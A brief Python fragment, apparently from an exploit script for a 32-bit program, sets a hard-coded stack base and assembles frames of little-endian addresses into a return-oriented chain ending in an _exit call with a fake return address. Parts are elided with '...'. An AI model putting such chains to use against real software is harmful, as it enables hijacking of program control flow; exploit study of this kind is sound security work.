...
#stack_base=0xffffd806
stack_base=0xffffd77c
...
frames = [
        ...
        [ b'\x9f\x88\x04\x08', b'\xe5\x88\x04\x08', b'\x02\x00\x00\x00', string_addr.to_bytes(4, byteorder='little') ],
            #b'\x2c\xd0\xff\xff' ],
        # _exit, fakeret, 1 arg
        [ b'\xe1\xcb\x06\x08', fakeret, b'\x00\x00\x00\x00' ]
        ] 
